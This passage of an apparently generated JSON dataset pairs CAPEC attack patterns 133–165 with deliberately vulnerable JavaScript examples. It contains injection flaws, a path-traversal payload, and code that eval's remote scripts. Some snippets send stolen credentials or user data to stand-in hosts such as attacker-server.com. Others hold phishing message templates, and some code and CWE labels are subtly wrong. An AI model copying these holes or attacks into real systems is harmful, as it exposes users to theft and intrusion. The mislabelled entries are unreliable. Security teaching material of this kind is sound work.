        "description": "This code snippet demonstrates a vulnerability to symbolic link attacks. The readFile function checks if a file exists before reading it, but does not properly resolve the symbolic link. An attacker can create a symbolic link to a sensitive file, and when the legitimate user accesses the file, the readFile function will read the sensitive file instead, allowing the attacker to access unauthorized files."
    },
    {
        "capec_id": "133",
        "code_snippet": "const debugMode = process.argv.includes('--debug');\nconst adminMode = process.argv.includes('--admin');\n\nif (debugMode) {\n  console.log('Debug mode enabled');\n  // Unintentionally expose sensitive information\n  console.log('Database credentials: ' + dbUsername + ':' + dbPassword);\n}\n\nif (adminMode) {\n  // Unchecked error condition, ignoring exceptions\n  try {\n    executeAdminCommand();\n  } catch (e) {}\n}\n\n// Incomplete list of disallowed inputs\nconst userInput = process.argv[2];\nif (userInput !== '--help' && userInput !== '--version') {\n  // Invocation of a control element at an unnecessarily deep horizontal layer\n  require('./adminModule').executeAdminFunction();\n}\n\n// Incorrect chaining or granularity of debug components\nif (debugMode && adminMode) {\n  require('./debugModule').enableDebugLogging();\n}",
        "description": "This code snippet demonstrates the CAPEC by attempting to invoke various switches and options to discover hidden functionality and weaknesses. It includes CWEs such as hidden functionality (CWE-912), incomplete list of disallowed inputs (CWE-184), unchecked error condition (CWE-391), incorrect chaining or granularity of debug components (CWE-1296), and invocation of a control element at an unnecessarily deep horizontal layer (CWE-1054)."
    },
    {
        "capec_id": "134",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userInput = req.query.name;\n  const mailOptions = {\n    from: 'user@example.com',\n    to: 'admin@example.com',\n    subject: 'Hello from ' + userInput,\n    text: 'Hello from ' + userInput\n  };\n\n  const transporter = nodemailer.createTransport({\n    host: 'smtp.example.com',\n    port: 587,\n    secure: false, // or 'STARTTLS'\n    auth: {\n      user: 'username',\n      pass: 'password'\n    }\n  });\n\n  transporter.sendMail(mailOptions, (error, info) => {\n    if (error) {\n      return console.log(error);\n    }\n    console.log('Email sent: ' + info.response);\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable email header injection in a Node.js application using Express.js and Nodemailer. The 'userInput' variable is not properly sanitized, allowing an attacker to inject malicious data, such as CRLF sequences, into the email headers. This can lead to email header splitting, command injection, or other types of attacks. The code does not neutralize special elements, making it vulnerable to CWE-150, CWE-116, CWE-147, CWE-113, and CWE-77."
    },
    {
        "capec_id": "135",
        "code_snippet": "const userInput = '%s%s%s';\nconst data = 'some data';\nconsole.log(sprintf(userInput, data, data, data));",
        "description": "This code snippet demonstrates the CAPEC of including formatting characters in a string input field. The userInput variable contains formatting characters (%s) that can be used to read or write to memory locations. The sprintf function is used with the userInput string, which can lead to unexpected behavior, such as reading or writing to memory, or executing arbitrary code. This code embodies CWE-134 (Use of Externally-Controlled Format String), CWE-20 (Improper Input Validation), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-914 (Improper Control of Dynamically-Identified Variables), and CWE-1286 (Improper Validation of Syntactic Correctness of Input)."
    },
    {
        "capec_id": "136",
        "code_snippet": "const ldap = require('ldapjs');\nconst client = ldap.createClient({ url: 'ldap://localhost:389' });\n\nfunction authenticate(username) {\n  const query = `(&(objectClass=person)(uid=${username}))`;\n  client.search('dc=example,dc=com', { filter: query }, (err, res) => {\n    res.on('searchEntry', (entry) => {\n      console.log('User found:', entry.object);\n    });\n  });\n}\n\n// Vulnerable usage:\nauthenticate('admin*(|(sn=*)(mail=*@example.com))');",
        "description": "This code snippet demonstrates an LDAP injection vulnerability. The `authenticate` function constructs an LDAP query using user input without proper validation or sanitization, allowing an attacker to inject additional commands or modify the query to disclose sensitive information."
    },
    {
        "capec_id": "137",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const userInput = req.query.userInput;\n  const query = `SELECT * FROM users WHERE name LIKE '%${userInput}%';`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send(err);\n    } else {\n      res.send(results);\n    }\n  });\n});",
        "description": "This code snippet demonstrates the CAPEC of manipulating request parameters to undermine security. The code uses the HTTP GET method to process a request and includes user input in the query string. The user input is not properly sanitized, allowing an attacker to inject special characters and modify the intended query. This is an example of CWE-88 (Improper Neutralization of Argument Delimiters in a Command), CWE-116 (Improper Encoding or Escaping of Output), CWE-598 (Use of GET Request Method With Sensitive Query Strings), CWE-838 (Inappropriate Encoding for Output Context), and CWE-77 (Improper Neutralization of Special Elements used in a Command)."
    },
    {
        "capec_id": "138",
        "code_snippet": "const userInput = \"java.lang.Runtime\";\nconst methodName = \"getRuntime\";\nconst methodParams = [];\n\ntry {\n  const clazz = java.lang.Class.forName(userInput);\n  const method = clazz.getMethod(methodName, ...methodParams);\n  const result = method.invoke(null, ...methodParams);\n  console.log(result);\n} catch (e) {\n  console.error(e);\n}",
        "description": "This JavaScript code snippet demonstrates the CAPEC of using externally-controlled input to select classes or code through reflection. The userInput variable is used to select a class, and the methodName variable is used to select a method to invoke on that class. This code is vulnerable to reflection attacks, command injection, and code injection, as an adversary can control the input to select malicious classes or methods, leading to unintended behavior or code execution."
    },
    {
        "capec_id": "139",
        "code_snippet": "const fs = require('fs');\nconst userInput = '../secret_files/../../../etc/passwd';\nconst filePath = `uploads/${userInput}`;\nfs.readFile(filePath, (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data);\n  }\n});",
        "description": "This code snippet demonstrates a path traversal vulnerability. The userInput variable is not properly sanitized, allowing an attacker to traverse the file system and access arbitrary files. The filePath variable is constructed by concatenating the userInput with a base directory, and then used to read a file using the fs.readFile function. An attacker can supply a userInput value such as '../secret_files/../../../etc/passwd' to access the /etc/passwd file, which is outside of the intended directory."
    },
    {
        "capec_id": "140",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\nlet currentState = 'form1';\n\napp.post('/form1', (req, res) => {\n  currentState = 'form2';\n  res.redirect('/form2');\n});\n\napp.post('/form2', (req, res) => {\n  if (currentState !== 'form2') {\n    res.status(403).send('Access denied');\n  } else {\n    // Process form2 data\n    res.send('Form2 submitted successfully');\n  }\n});\n\napp.post('/form3', (req, res) => {\n  if (currentState !== 'form3') {\n    res.status(403).send('Access denied');\n  } else {\n    // Process form3 data\n    res.send('Form3 submitted successfully');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that uses a sequence of forms to collect user information. The application uses a global variable 'currentState' to keep track of the current form state. However, an attacker can bypass the form sequence by directly submitting a request to a later form (e.g., '/form3') without going through the previous forms. This can lead to incomplete collection of information, incorrect assumptions about the submitted data, or other problems that can impair the functioning of the application. The code is vulnerable to CWE-372 (Incomplete Internal State Distinction), CWE-472 (External Control of Assumed-Immutable Web Parameter), CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-807 (Reliance on Untrusted Inputs in a Security Decision), and CWE-352 (Cross-Site Request Forgery)."
    },
    {
        "capec_id": "141",
        "code_snippet": "const cache = {};\n\nfunction getDataFromCache(key) {\n  return cache[key];\n}\n\nfunction putDataInCache(key, value) {\n  cache[key] = value;\n}\n\n// CWE-348: Using less trusted source\nfunction getTrustedData() {\n  return getDataFromCache('trustedData');\n}\n\nfunction getUntrustedData() {\n  return getDataFromCache('untrustedData');\n}\n\n// CWE-345: Insufficient verification of data authenticity\nfunction processData(data) {\n  if (data !== undefined) {\n    // Process the data without verifying its origin or authenticity\n    console.log('Processing data:', data);\n  }\n}\n\n// CWE-349: Acceptance of extraneous untrusted data with trusted data\nfunction processTrustedData() {\n  const trustedData = getTrustedData();\n  const untrustedData = getUntrustedData();\n  processData(trustedData + untrustedData);\n}\n\n// CWE-346: Origin validation error\nfunction validateDataOrigin(data) {\n  // No validation is performed, always returns true\n  return true;\n}\n\n// CWE-524: Use of cache containing sensitive information\nfunction cacheSensitiveData() {\n  putDataInCache('sensitiveData', 'secretValue');\n}\n\n// Attack scenario: An attacker exploits the cache to store malicious data\nputDataInCache('trustedData', '<script>maliciousCode()</script>');\nprocessTrustedData();",
        "description": "This code snippet demonstrates a cache-based vulnerability where an attacker can inject malicious data into the cache, which is then used by the application without proper verification. The code uses a cache to store data, but does not properly verify the origin or authenticity of the data. The cache is also used to store sensitive information, which can be accessed by an attacker. The application uses the cached data without validation, leading to potential security exploits."
    },
    {
        "capec_id": "142",
        "code_snippet": "const dns = require('dns');\n\nfunction resolveDomain(domain) {\n  dns.resolve(domain, (err, addresses) => {\n    if (err) {\n      console.log(err);\n    } else {\n      const ip = addresses[0];\n      dns.reverse(ip, (err, hostname) => {\n        if (err) {\n          console.log(err);\n        } else {\n          // Trust the hostname from the reverse DNS resolution\n          console.log(`Resolved ${domain} to ${hostname}`);\n          // Perform security-critical action based on unverified hostname\n          if (hostname === 'trusted.example.com') {\n            console.log('Granting access...');\n          }\n        }\n      });\n    }\n  });\n}\n\nresolveDomain('example.com');",
        "description": "This JavaScript code snippet demonstrates a vulnerable DNS resolution implementation that is susceptible to DNS cache poisoning attacks. It uses the 'dns' module to resolve a domain name to an IP address and then performs a reverse DNS resolution to obtain the hostname. The code trusts the hostname from the reverse DNS resolution without proper verification, making it vulnerable to CWE-350. Additionally, it does not properly verify the origin or authenticity of the DNS data, making it vulnerable to CWE-345, CWE-346, CWE-348, and CWE-349. An adversary can modify the DNS cache to resolve the domain name to a malicious IP address, which would then be used to obtain a fake hostname, allowing the adversary to masquerade as a trusted domain."
    },
    {
        "capec_id": "143",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.get('/repository', (req, res) => {\n  fs.readdirSync('./repository').forEach(file => {\n    res.download(file);\n  });\n});\n\napp.get('/index', (req, res) => {\n  const index = [];\n  fs.readdirSync('./private-docs').forEach(file => {\n    index.push(file);\n  });\n  res.json(index);\n});\n\napp.get('/download-code', (req, res) => {\n  const code = fs.readFileSync('https://example.com/malicious-code.js', 'utf8');\n  eval(code);\n});\n\napp.listen(3000, () => {\n  console.log('Server started');\n});",
        "description": "This code snippet demonstrates the CAPEC of an adversary searching a targeted web site for web pages that have not been publicized. The code has several vulnerabilities related to CWEs: 425 (Direct Request), 527 (Exposure of Version-Control Repository), 612 (Improper Authorization of Index Containing Sensitive Information), 219 (Storage of File with Sensitive Data Under Web Root), and 494 (Download of Code Without Integrity Check). The code allows an adversary to access a version control repository, download sensitive files, access an index of private documents, and execute malicious code downloaded from an untrusted source."
    },
    {
        "capec_id": "144",
        "code_snippet": "const axios = require('axios');\n\nasync function scanForHiddenServices(url) {\n  try {\n    const response = await axios.get(url + '/?wsdl');\n    const wsdl = response.data;\n    const services = wsdl.match(/<service name=\"(.*?)\"/g);\n    services.forEach(service => {\n      const serviceName = service.match(/\"(.*?)\"/)[1];\n      axios.get(url + '/' + serviceName)\n        .then(response => {\n          console.log(`Found hidden service: ${serviceName}`);\n          // Download and execute code without integrity check\n          const script = response.data.match(/<script>(.*?)</script>/)[1];\n          eval(script);\n        })\n        .catch(error => {\n          console.error(`Error accessing service: ${error}`);\n        });\n    });\n  } catch (error) {\n    console.error(`Error accessing WSDL: ${error}`);\n  }\n}\n\nscanForHiddenServices('https://example.com');",
        "description": "This JavaScript code snippet demonstrates the CAPEC of searching for unpublished web services on a targeted website. It uses the CWEs of exposure of WSDL file containing sensitive information (CWE-651) and download of code without integrity check (CWE-494). The code sends a GET request to the target URL with '?wsdl' appended to retrieve the WSDL file, then extracts the service names from the WSDL file and sends GET requests to each service. If a service is found, it downloads and executes the code without verifying its integrity. This code is vulnerable to forced browsing (CWE-425) and omission of security-relevant information (CWE-223)."
    },
    {
        "capec_id": "145",
        "code_snippet": "function sendMessage(message) {\n  const hash = crypto.createHash('md5'); // CWE-328: Use of Weak Hash\n  hash.update(message);\n  const checksum = hash.digest('hex');\n  const messageWithChecksum = `${message}:${checksum}`;\n  // CWE-354: Improper Validation of Integrity Check Value\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n  // No validation of the checksum is performed on the receiving end\n  sendToRecipient(messageWithChecksum);\n}\n\nfunction receiveMessage(messageWithChecksum) {\n  const [message, checksum] = messageWithChecksum.split(':');\n  // CWE-353: Missing Support for Integrity Check\n  // No mechanism to verify the integrity of the data during transmission\n  const receivedChecksum = crypto.createHash('md5').update(message).digest('hex');\n  if (receivedChecksum === checksum) {\n    console.log('Message received successfully');\n  } else {\n    console.log('Error: Checksum mismatch');\n  }\n}",
        "description": "This code snippet demonstrates the CAPEC of checksum spoofing. The sendMessage function creates a weak MD5 hash of the message and appends it to the message. The receiveMessage function splits the received message and checksum, but does not properly validate the checksum. An adversary could modify the message and update the checksum, allowing the modified message to appear valid to the recipient."
    },
    {
        "capec_id": "146",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xmljs = require('xml-js');\n\napp.post('/submit', (req, res) => {\n  const xmlData = req.body.xml;\n  const xsdData = req.body.xsd;\n  const xml = xmljs.js2xml(xmlData, {compact: true, ignoreComment: true, spaces: 4});\n  const xsd = xmljs.js2xml(xsdData, {compact: true, ignoreComment: true, spaces: 4});\n  const parser = new DOMParser();\n  const xmlDoc = parser.parseFromString(xml, 'application/xml');\n  const xsdDoc = parser.parseFromString(xsd, 'application/xml');\n  const validator = new xmljs.XMLValidator();\n  validator.validate(xmlDoc, xsdDoc);\n  res.send('XML validated successfully');\n});",
        "description": "This code snippet demonstrates a vulnerable XML schema validation implementation in a Node.js application. The code accepts XML data and XSD schema from an untrusted source (CWE-112) and uses them to validate the XML document. An attacker can manipulate the XSD schema to compromise the validation process, leading to schema poisoning (CAPEC). The code also lacks proper input validation and sanitization, making it vulnerable to XML injection (CWE-91) and XPath injection (CWE-643) attacks. Additionally, the code allows external control of system or configuration settings (CWE-15) and does not sufficiently verify inputs that are assumed to be immutable (CWE-472)."
    },
    {
        "capec_id": "147",
        "code_snippet": "const soap = require('soap');\nconst xml = '<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope/\"> <soap:Body> <m:GetPrice xmlns:m=\"http://example.com\"> <m:ItemID>test</m:ItemID> </m:GetPrice> </soap:Body> </soap:Envelope>';\n\nfunction floodSOAP(url) {\n    for (let i = 0; i < 100000; i++) {\n        soap.createClient(url, function(err, client) {\n            client.GetPrice({ ItemID: 'test' }, function(err, result) {\n                // Do nothing\n            });\n        });\n    }\n}\n\nfloodSOAP('http://example.com/soap');",
        "description": "This JavaScript code snippet demonstrates a resource depletion attack by flooding a SOAP service with a large number of small XML messages. The code uses the 'soap' package to create a SOAP client and send repetitive GetPrice requests to the target service. The lack of input validation (CWE-112) and uncontrolled resource consumption (CWE-400) make the target service vulnerable to this type of attack. Additionally, the use of cleartext transmission (CWE-319) and incorrect destination specification (CWE-941) further exacerbate the vulnerability. The allocation of resources without limits or throttling (CWE-770) allows the attacker to deplete the target's resources quickly."
    },
    {
        "capec_id": "148",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/user-data', (req, res) => {\n  const userData = req.query.userData;\n  res.send(`<script>document.location='http://attacker-site.com/steal-data?' + encodeURIComponent(userData);</script>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates Content Spoofing (CAPEC-103) by exploiting CWE-352 (Cross-Site Request Forgery) and CWE-433 (Unparsed Raw Web Content Delivery). The code sets up an Express.js server that accepts user data as a query parameter and returns a malicious script that redirects the user to an attacker-controlled site, allowing the attacker to steal the user's data. The code also lacks proper verification of data authenticity (CWE-345) and does not ensure message integrity during transmission (CWE-924). Additionally, the code incorrectly specifies the destination in the communication channel (CWE-941), making it vulnerable to content spoofing attacks."
    },
    {
        "capec_id": "149",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction createTempFile(userInput) {\n    const tempDir = './temp';\n    const tempFileName = userInput + '.tmp';\n    const tempFilePath = path.join(tempDir, tempFileName);\n    fs.writeFileSync(tempFilePath, 'temporary file content');\n    return tempFilePath;\n}\n\n// Example usage:\nconst userInput = 'predictable_temp_file';\nconst tempFilePath = createTempFile(userInput);\nconsole.log(`Temporary file created at: ${tempFilePath}`);",
        "description": "This code snippet demonstrates the creation of a temporary file with a predictable name based on user input, which can be exploited by an attacker to launch further attacks. The code uses the 'fs' and 'path' modules to create a temporary file in a directory with insecure permissions, and the file name is controlled by user input, making it vulnerable to path equivalence and external control of file name or path attacks."
    },
    {
        "capec_id": "150",
        "code_snippet": "const fs = require('fs');\n\n// CWE-552: Files or Directories Accessible to External Parties\nfs.readdir('/etc', (err, files) => {\n  if (err) {\n    console.error(err);\n  } else {\n    files.forEach(file => {\n      fs.readFile(`/etc/${file}`, (err, data) => {\n        if (err) {\n          console.error(err);\n        } else {\n          // CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\n          console.log(`Found sensitive data in ${file}: ${data}`);\n        }\n      });\n    });\n  }\n});\n\n// CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\nconst deviceData = fs.readFileSync('/dev/sensitive_device');\nconsole.log(`Device data: ${deviceData}`);\n\n// CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\nconst debugData = fs.readFileSync('/sys/kernel/debug/sensitive_info');\nconsole.log(`Debug data: ${debugData}`);\n\n// CWE-1323: Improper Management of Sensitive Trace Data\nconst traceData = fs.readFileSync('/sys/kernel/trace/sensitive_trace');\nconsole.log(`Trace data: ${traceData}`);\n\n// CWE-1330: Remanent Data Readable after Memory Erase\nconst erasedData = fs.readFileSync('/dev/erased_memory');\nconsole.log(`Erased data: ${erasedData}`);",
        "description": "This code snippet demonstrates the CAPEC of exploiting well-known locations for resources to undermine security. It uses various CWEs to illustrate the vulnerabilities, including accessing sensitive files and directories, exposing debug information, failing to scrub sensitive data from decommissioned devices, and improperly managing sensitive trace data and remanent data."
    },
    {
        "capec_id": "151",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'password') {\n    req.session.username = username;\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.status(403).send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates identity spoofing by implementing an authentication mechanism that can be bypassed by an attacker. The code uses a simple username and password check to authenticate users, but it does not verify the identity of the user. An attacker can simply send a request with the correct username and password to gain access to the protected resource. This code is vulnerable to CWE-287 (Improper Authentication), CWE-290 (Authentication Bypass by Spoofing), CWE-1390 (Weak Authentication), CWE-322 (Key Exchange without Entity Authentication), and CWE-302 (Authentication Bypass by Assumed-Immutable Data)."
    },
    {
        "capec_id": "153",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/user', (req, res) => {\n  const { username, email } = req.body;\n  if (username && email) {\n    // No input validation is performed on the username and email\n    // An attacker can supply malicious input, such as SQL injection or cross-site scripting (XSS)\n    const query = `INSERT INTO users (username, email) VALUES ('${username}', '${email}');`;\n    db.query(query, (err, result) => {\n      if (err) {\n        res.status(500).send({ message: 'Error creating user' });\n      } else {\n        res.send({ message: 'User created successfully' });\n      }\n    });\n  } else {\n    res.status(400).send({ message: 'Invalid request' });\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable Express.js API endpoint that accepts user registration requests. The endpoint does not perform proper input validation on the username and email fields, making it susceptible to SQL injection and cross-site scripting (XSS) attacks. An attacker can supply malicious input, such as a SQL injection payload or a XSS script, which can lead to unauthorized data access or execution of malicious code."
    },
    {
        "capec_id": "154",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://example.com/api/data', true);\nxhr.withCredentials = true;\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const response = JSON.parse(xhr.responseText);\n    const iframe = document.createElement('iframe');\n    iframe.src = response.url;\n    document.body.appendChild(iframe);\n  }\n};\nxhr.send();",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that allows an adversary to deceive the application and convince it to request a resource from an unintended location. The code uses XMLHttpRequest to make a GET request to a URL, and then uses the response to create an iframe with a src attribute set to the response URL. This can lead to authentication bypass by spoofing (CWE-290) and improper verification of the source of the communication channel (CWE-940). The code also misrepresents critical information to the user (CWE-451) by not properly verifying the origin of the response. Additionally, it does not correctly specify the intended destination for the request (CWE-941) and does not properly restrict the communication channel to the intended endpoint (CWE-923)."
    },
    {
        "capec_id": "155",
        "code_snippet": "const fs = require('fs');\nconst tempDir = './temp';\nconst sensitiveData = 'secretKey=1234567890';\n\n// CWE-377: Insecure Temporary File\nfs.writeFileSync(`${tempDir}/tempFile.txt`, sensitiveData);\n\n// CWE-524: Use of Cache Containing Sensitive Information\nconst cache = require('memory-cache');\ncache.put('sensitiveData', sensitiveData);\n\n// CWE-379: Creation of Temporary File in Directory with Insecure Permissions\nfs.mkdirSync(tempDir, 0o777);\nfs.writeFileSync(`${tempDir}/tempFile2.txt`, sensitiveData);\n\n// CWE-378: Creation of Temporary File With Insecure Permissions\nfs.openSync(`${tempDir}/tempFile3.txt`, 'w', 0o666);\nfs.writeFileSync(`${tempDir}/tempFile3.txt`, sensitiveData);\n\n// CWE-219: Storage of File with Sensitive Data Under Web Root\nconst express = require('express');\nconst app = express();\napp.use(express.static('temp'));\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates the CAPEC of exploiting temporary, insecure storage of information. It creates temporary files with sensitive data in a directory with insecure permissions, uses a cache containing sensitive information, and stores sensitive data under the web root with insufficient access control."
    },
    {
        "capec_id": "157",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/sensitiveData', (req, res) => {\n  const sensitiveInfo = 'username:password';\n  res.send(sensitiveInfo);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable server that transmits sensitive information (username and password) in cleartext over an insecure communication channel, making it susceptible to sniffing attacks (CAPEC-300). The code does not encrypt the sensitive data before transmission, violating CWE-311 and CWE-319. An attacker can intercept the communication and access the sensitive information. The code also lacks message integrity checks during transmission, violating CWE-924. Furthermore, the use of an insecure communication channel may expose the system to covert channels (CWE-514) and physical side channels (CWE-1300)."
    },
    {
        "capec_id": "158",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const sensitiveData = { username: 'admin', password: 'password123' };\n  res.json(sensitiveData);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server that transmits sensitive information in cleartext, making it susceptible to network sniffing attacks. The server listens on port 3000 and responds to GET requests at '/api/data' with a JSON object containing a username and password. An attacker can sniff the network traffic to capture this sensitive information, as it is not encrypted. This code embodies CWE-311, CWE-319, CWE-294, and CWE-497."
    },
    {
        "capec_id": "159",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nlet libPath = './lib/mylib.so';\nlet libDir = path.dirname(libPath);\nlet libName = path.basename(libPath);\n\nprocess.env.LD_LIBRARY_PATH = libDir;\n\nconst myLib = require(libName);\n\nmyLib.doSomething();",
        "description": "This code snippet demonstrates the CAPEC pattern of exploiting weaknesses in the way an application searches for external libraries. The code sets the LD_LIBRARY_PATH environment variable to a directory under the control of an adversary, allowing the loading of a malicious library with the same name as the intended library. This can lead to the execution of arbitrary code, especially if the application has elevated privileges. The code relates to CWEs 706, 426, 1265, 73, and 427."
    },
    {
        "capec_id": "160",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/executeScript', (req, res) => {\n  const script = req.query.script;\n  res.set('Content-Type', 'text/html');\n  res.send(`<script>${script}</script>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Express.js server that takes a script as a query parameter and executes it on the client-side by sending it back as part of an HTML response. This allows an attacker to inject malicious scripts, leading to Cross-Site Scripting (XSS) vulnerabilities (CWE-79). The server does not properly validate the origin of the input data (CWE-346) and does not neutralize the script syntax, allowing it to be executed by the client's web browser. This can lead to unauthorized access and malicious activities."
    },
    {
        "capec_id": "161",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/bank', (req, res) => {\n  const redirectUrl = 'http://pharming-site.com';\n  res.redirect(redirectUrl);\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  // Send credentials to attacker's server\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://attacker-server.com/collect', true);\n  xhr.send(`username=${username}&password=${password}`);\n  res.send('Login successful!');\n});",
        "description": "This code snippet demonstrates a Pharming attack, where an attacker redirects a user to a fake banking site to collect login credentials. The code establishes a communication channel with an unintended endpoint (CWE-923), incorrectly specifies the destination in the communication channel (CWE-941), and fails to ensure message integrity during transmission (CWE-924). Additionally, it exposes sensitive system information to an unauthorized control sphere (CWE-497) by sending credentials to the attacker's server. The code also has an incorrect conversion of security identifiers (CWE-1292) as it does not properly validate the redirect URL."
    },
    {
        "capec_id": "162",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/purchase', (req, res) => {\n  const itemPrice = req.body.price;\n  const quantity = req.body.quantity;\n  const totalCost = itemPrice * quantity;\n  // Process payment and update database with modified price\n  res.send(`Thank you for your purchase! Your total cost is $${totalCost}.`);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable e-commerce application that relies on client-side input for pricing information. The server-side code does not validate the price and quantity fields, allowing an attacker to modify them on the client-side and submit the altered data to the server. The server then uses the modified pricing information to calculate the total cost, enabling the attacker to acquire items at a lower cost than intended."
    },
    {
        "capec_id": "163",
        "code_snippet": "const maliciousUrl = 'https://evil.com/phishing';\nconst trustedEntity = 'https://trusted.com';\n\n// CWE-451: Misrepresenting critical information\nconst phishingEmail = `Dear ${user.name},\n\nPlease click on this link to update your account information: <a href='${maliciousUrl}'><b>${trustedEntity}</b></a>\n\nBest, ${trustedEntity}`;\n\n// CWE-601: URL Redirection to Untrusted Site\nfunction redirectUrl(url) {\n  window.location.href = url;\n}\n\n// CWE-301: Reflection Attack in an Authentication Protocol\nfunction authenticate(user, password) {\n  // Simple authentication protocol vulnerable to reflection attack\n  if (user === 'admin' && password === 'password') {\n    return true;\n  } else {\n    return false;\n  }\n}\n\n// CWE-942: Permissive Cross-domain Policy with Untrusted Domains\nconst crossDomainPolicy = {\n  'https://evil.com': {\n    'allow-from': '*'\n  }\n};\n\n// CWE-1022: Use of Web Link to Untrusted Target with window.opener Access\nfunction openUntrustedLink() {\n  const untrustedLink = document.createElement('a');\n  untrustedLink.href = maliciousUrl;\n  untrustedLink.target = '_blank';\n  untrustedLink.click();\n}",
        "description": "This code snippet demonstrates a spear phishing attack, where a malicious actor targets a specific user or group with a tailored email that appears to come from a trusted entity. The email contains a link to a compromised site, which is made to look legitimate by misrepresenting critical information (CWE-451). The link is vulnerable to URL redirection to an untrusted site (CWE-601). The authentication protocol used is simple and vulnerable to reflection attacks (CWE-301). The cross-domain policy is permissive and allows access to untrusted domains (CWE-942). Finally, the code uses a web link to an untrusted target with window.opener access, allowing the external site to modify security-critical properties (CWE-1022)."
    },
    {
        "capec_id": "164",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst smsGateway = require('sms-gateway');\n\napp.get('/phish', (req, res) => {\n  const smsMessage = 'Your account has been compromised! Click this link to reset your password: http://phishy-site.com/reset';\n  smsGateway.sendSMS('+1234567890', smsMessage);\n  res.send('Phishing SMS sent!');\n});\n\napp.get('/reset', (req, res) => {\n  const passwordInput = '<input type=\"password\" name=\"password\" placeholder=\"Enter new password\">';\n  res.send(`<form action=\"/reset\" method=\"post\">${passwordInput}<button type=\"submit\">Reset Password</button></form>`);\n});\n\napp.post('/reset', (req, res) => {\n  const password = req.body.password;\n  // No authentication or validation performed\n  res.send(`Password reset successfully! Your new password is: ${password}`);\n});",
        "description": "This code snippet demonstrates a mobile phishing attack. The attacker sends a phishing SMS to the victim's phone, enticing them to visit a compromised website to reset their password. The website has a simple password reset form with no authentication or validation, allowing the attacker to harvest the victim's password. The code uses the express.js framework and a fictional SMS gateway to send the phishing SMS."
    },
    {
        "capec_id": "165",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.post('/upload', (req, res) => {\n  const file = req.body.file;\n  const filePath = './uploads/' + file.name;\n  fs.writeFileSync(filePath, file.data);\n  res.send('File uploaded successfully!');\n});\n\napp.get('/download', (req, res) => {\n  const fileName = req.query.fileName;\n  const filePath = './uploads/' + fileName;\n  res.download(filePath);\n});",
        "description": "This code snippet demonstrates a vulnerable file upload and download functionality. The file name and path are controlled by user input, allowing an attacker to manipulate the file contents or attributes, causing incorrect processing by the application. This can lead to buffer overflows, execution of arbitrary code, or exposure of sensitive information. The code is vulnerable to CWE-73, CWE-646, CWE-99, CWE-377, and CWE-22."
    },
    {
        "capec_id": "166",
